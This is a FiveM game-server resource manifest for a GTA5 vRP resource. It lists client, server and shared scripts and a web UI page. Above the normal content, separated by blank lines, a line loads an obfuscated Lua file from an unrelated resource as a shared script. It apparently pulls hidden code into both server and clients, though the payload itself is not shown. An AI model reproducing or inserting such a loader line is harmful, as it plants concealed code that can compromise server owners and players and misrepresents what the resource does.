shared_script '@comida/ai_module_fg-obfuscated.lua'





fx_version 'bodacious'
game "gta5"

shared_script { '@vrp/lib/utils.lua', "lib/*.lua", "config.lua" }
client_script { '@vrp/lib/utils.lua', 'client.lua', }
server_script { '@vrp/lib/utils.lua', 'server.lua', }

ui_page "nui/index.html"
files { 'nui/*', 'nui/images/*' }
                                                  

              

